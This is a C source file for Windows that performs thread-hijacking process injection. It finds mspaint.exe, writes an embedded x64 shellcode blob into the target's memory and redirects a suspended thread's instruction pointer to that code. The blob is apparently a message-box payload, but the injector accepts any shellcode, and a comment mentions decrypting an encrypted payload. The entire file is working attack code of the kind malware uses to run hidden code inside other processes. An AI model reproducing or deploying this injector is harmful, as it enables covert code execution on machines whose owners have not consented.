#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// 64-bit shellcode to display messagebox windows
unsigned char shellcodePayload[329] = {
  0xFC, 0x48, 0x81, 0xE4, 0xF0, 0xFF, 0xFF, 0xFF, 0xE8, 0xD0, 0x00, 0x00,
	0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65,
	0x48, 0x8B, 0x52, 0x60, 0x3E, 0x48, 0x8B, 0x52, 0x18, 0x3E, 0x48, 0x8B,
	0x52, 0x20, 0x3E, 0x48, 0x8B, 0x72, 0x50, 0x3E, 0x48, 0x0F, 0xB7, 0x4A,
	0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02,
	0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52,
	0x41, 0x51, 0x3E, 0x48, 0x8B, 0x52, 0x20, 0x3E, 0x8B, 0x42, 0x3C, 0x48,
	0x01, 0xD0, 0x3E, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0,
	0x74, 0x6F, 0x48, 0x01, 0xD0, 0x50, 0x3E, 0x8B, 0x48, 0x18, 0x3E, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x5C, 0x48, 0xFF, 0xC9, 0x3E,
	0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31,
	0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75,
	0xF1, 0x3E, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD6,
	0x58, 0x3E, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x3E, 0x41,
	0x8B, 0x0C, 0x48, 0x3E, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x3E,
	0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E,
	0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20,
	0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x3E, 0x48, 0x8B, 0x12,
	0xE9, 0x49, 0xFF, 0xFF, 0xFF, 0x5D, 0x49, 0xC7, 0xC1, 0x40, 0x00, 0x00,
	0x00, 0x3E, 0x48, 0x8D, 0x95, 0x1A, 0x01, 0x00, 0x00, 0x3E, 0x4C, 0x8D,
	0x85, 0x2F, 0x01, 0x00, 0x00, 0x48, 0x31, 0xC9, 0x41, 0xBA, 0x45, 0x83,
	0x56, 0x07, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6,
	0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C,
	0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
	0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x48, 0x65, 0x6C, 0x6C, 0x6F,
	0x2C, 0x20, 0x63, 0x72, 0x61, 0x63, 0x6B, 0x65, 0x64, 0x20, 0x70, 0x6F,
	0x70, 0x66, 0x64, 0x00, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64,
	0x33, 0x64, 0x64, 0x64, 0x00
};

unsigned int lengthOfShellcodePayload = 329;

int SearchForProcess(const char * processName){
    HANDLE hSnapshotOfProcesses;
    PROCESSENTRY32 processStruct;
    int pid = 0;

    hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;

    processStruct.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hSnapshotOfProcesses, &processStruct)){
        CloseHandle(hSnapshotOfProcesses);
        return 0;
    }
    while(Process32Next(hSnapshotOfProcesses, &processStruct)){
        if(lstrcmpiA(processName, processStruct.szExeFile) == 0){
            pid = processStruct.th32ProcessID;
            break;
        }
    }
    CloseHandle(hSnapshotOfProcesses);
    return pid;
}


HANDLE SearchForThread(int pid){
    HANDLE hThread = NULL;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    while(Thread32Next(Snap, &thEntry)){
        if(thEntry.th32OwnerProcessID == pid){
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
            break;
        }
    }
    CloseHandle(Snap);
    return hThread;
}

int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_length){
    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;

    hThread = SearchForThread(pid);
    if(hThread == NULL){
        printf("ERROR. Failed to hijack thread\n");
        return -1;
    }

    // (Optional) Decrypt payload if encrypted
    // perfomr payload injection
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_length, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_length, (SIZE_T *) NULL);

    SuspendThread(hThread);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    #ifdef _M_IX86
    ctx.Eip = (DWORD_PTR) pRemoteCode;
    #else
    ctx.Rip = (DWORD_PTR) pRemoteCode;
    #endif
    SetThreadContext(hThread, &ctx);

    return ResumeThread(hThread);
}



int main(void){
    int pid= 0;
    HANDLE hProcess = NULL;

    pid = SearchForProcess("mspaint.exe");

    if(pid){
        printf("mspaint.exe PID = %d\n", pid);
        //try to open target process
        hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | 
            PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)  pid);
        
        if(hProcess != NULL){
            InjectCTX(pid, hProcess, shellcodePayload, lengthOfShellcodePayload);
            CloseHandle(hProcess);
        }
    }
    return 0;
}